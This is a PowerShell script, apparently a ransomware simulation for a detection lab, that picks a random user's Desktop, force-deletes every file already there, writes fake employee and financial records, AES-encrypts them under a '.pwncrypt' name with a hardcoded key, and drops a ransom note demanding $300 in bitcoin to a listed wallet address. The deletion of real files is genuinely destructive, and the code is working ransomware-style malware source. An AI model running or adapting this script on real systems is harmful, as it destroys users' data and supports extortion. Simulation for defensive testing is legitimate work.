 # Get all user profile directories in C:\Users\
$userDirectories = Get-ChildItem -Path "C:\Users\" | Where-Object { 
    $_.PSIsContainer -and !(($_.Name -eq 'Public') -or ($_.Name -eq 'Default') -or ($_.Name -like '*Admin*')) 
}

# Select a random user from the list of user directories
$randomUser = $userDirectories | Get-Random

# Build the desktop path for the random user
$documentsFolder = Join-Path $randomUser.FullName "Desktop"
    

# Create the Documents folder if it doesn't exist
if (-not (Test-Path -Path $documentsFolder)) {
    New-Item -Path $documentsFolder -ItemType Directory
}

# Clear the Documents folder if it already contains files
Get-ChildItem -Path $documentsFolder -File | ForEach-Object {
    Remove-Item $_.FullName -Force
}

# Define encryption key and IV (Initialization Vector) for AES
$key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
$iv = [byte[]](1..16) # IV should be 16 bytes for AES

# Function to encrypt text using AES
function Encrypt-Text($plainText, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)

    $aes.Dispose()
    return $encryptedBytes
}

# Fake company information (You can adjust these as needed)
$fakeFiles = @{
    "EmployeeRecords.txt" = "Johnathan Maxwell Doe, Employee ID: 12345, SSN: 123-45-6789, Passport: P1234567, DOB: 02/14/1975, Role: Senior Manager of Global Operations, Address: 123 Elm St, San Francisco, CA. Compensation: 450K + 30% bonus. Notes: Known for negotiation skills, led multiple high-profile acquisitions. Credit Card: 4111-1111-1111-1111 Exp: 12/25 CVV: 123.";
    "ProjectList.txt" = "Project X - Codename: Odyssey Initiative. Est. Completion: 2024-12-31. Scope: Market expansion in Asia-Pacific, targeting 15 countries. Budget: 50M, Risks: Political instability, supply chain issues, whistleblower risks. Secret Legal Settlements: Undisclosed fees for permits.";
    "CompanyFinancials.txt" = "FY2024: Revenue: 150M, Profit: 18.75M. Investments: 20M for data centers, 10M in AI research. Losses: 3.5M ransomware attack. FY2023: Revenue: 120M, Profit: 12M. Internal Audit: Suspicious transactions linked to offshore accounts, pending investigation.";
}

# Create fake text files in the Documents folder, encrypt them, then delete the originals
foreach ($file in $fakeFiles.Keys) {
    $filePath = Join-Path $documentsFolder $file.Replace('.txt','.pwncrypt.txt')

    # Write the fake company information to the text file
    $fakeContent = $fakeFiles[$file]
    # & cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command New-Item -Path $filePath -Force -ItemType File
    Set-Content -Path $filePath -Value $fakeContent

    # Encrypt the file content
    $encryptedContent = Encrypt-Text $fakeContent $key $iv

    # Write the encrypted content to the new file
    [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
}

# Write the decryption instructions in the Documents folder
"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`nYour files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1`n" | Out-File -FilePath "$($documentsFolder)\__________decryption-instructions.txt" -Force
